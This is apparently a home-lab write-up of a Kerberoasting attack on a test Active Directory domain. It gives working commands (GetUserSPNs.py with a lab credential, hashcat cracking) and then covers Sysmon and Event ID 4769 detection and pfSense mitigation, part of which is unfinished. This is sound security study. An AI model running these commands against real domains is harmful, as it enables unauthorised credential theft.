# Active Directory Attack Playbook (Kerberos-based SPN Extraction and Credential Compromise)

## **Overview**

- **Target:** Active Directory Domain Controller (within the soc.lab domain)
   - IP Address: 192.168.10.10
   - Domain: SOC.LAB
   - 
- **Attacker:** Kali 
   - IP Address: 192.168.20.30
## **Objective** 
The objective of this attack was to enumerate and extract Service Principal Names (SPNs) from the Active Directory environment and attempt to crack the Kerberos TGS hashes to gain unauthorized access to domain accounts.
Following the other attacks, we are already know the credentials from an User and the Active Directory Domain.

## Attack Execution Timeline:

- Checked that Kerberos (port 88) is open:
```bash
nc -vz 192.168.10.10 88
```
- Update the default DNS ip to point directly to the Domain Controller.

- Run GetUserSPNs.py from the mpacket toolkit to request SPNs and attempt Kerberos TGS hash extraction:
```bash
python3 GetUserSPNs.py SOC.LAB/labadmin:Root1234! -request
```
Output:

![hash](https://github.com/user-attachments/assets/25122eab-7eb9-4de7-a62d-2ceeda7e50c9)

- After that I cracked the Kerberos TGS Hash using hashcat with rockyou.txt, and saved on a cracked.txt file:
```bash
hashcat -m 13100 spn_hash.txt /usr/share/wordlists/rockyou.txt --force -o cracked.txt
```



## **Monitoring Windows Logs**

I started watching Sysmon Logs Analysis and identified multiple Event ID 3 entries in Sysmon logs, which makes it suspisious, knowing its coming from the same IP, and from external zone (DMZ): 

- All connections originated from IP 192.168.10.10, targeting 192.168.20.30.

- Different ephemeral ports were used, suggesting automated scanning or even communication.

![multipleSysmonlogs](https://github.com/user-attachments/assets/01ab753c-f8f0-42d1-8882-62f2a652937a)



With that, I went through Windows Logs Security, and found multiple found a large number of **Event ID 4769 – Kerberos Service Ticket Request**, from the same source as well:
- ![kerberos_tickets](https://github.com/user-attachments/assets/9275278e-067c-466c-a2bd-3fc551e18f81)


And as we can see in the screenshots bellow from the logs, the same IP: 192.168.20.30 requested multiple Kerberos Service Tickets (Event ID 4769) for various user accounts in the SOC.LAB domain. This pattern of activity suggests the use of a **Kerberoasting attack**, where the attacker queries the Service Principal Names (SPNs) associated with these accounts to obtain encrypted TGS (Ticket Granting Service) hashes, which we already know he did.

- User Jordan:
- ![Jordan](https://github.com/user-attachments/assets/4aab463d-1130-48ea-affc-d23800dd389f)

- User Candace:
- ![candace_rojas](https://github.com/user-attachments/assets/0fa652ef-089b-4bde-97b4-280412b502bf)

And finally, right after the last Kerberos Service Ticket Request, we see an Event ID 4634 – Logoff, from the user labadmin, so with that, we know whose password was first compromised to successfully request all this content.

## **Firewall Rules on pfSense to Mitigate this:**
1- Block Unauthorized Kerberos Requests:
  Screenshot da rule no pfsense....

  This rule blocks any Kerberos traffic (port 88) from devices that are not domain controllers, which prevents unauthorized users from interacting with the Kerberos service and reduces the risk of Kerberoasting.

2- Limit External and Internal LDAP Queries:

Screenshot da rule.......

This prevents attackers from using LDAP enumeration tools (like GetUserSPNs.py), a well knowed script, to extract Service Principal Names. LDAP is only needed for trusted systems—blocking it for regular users reduces exposure, like we've just seen.

Note: In this experiment, CrowdSec was disabled to allow this action to proceed.
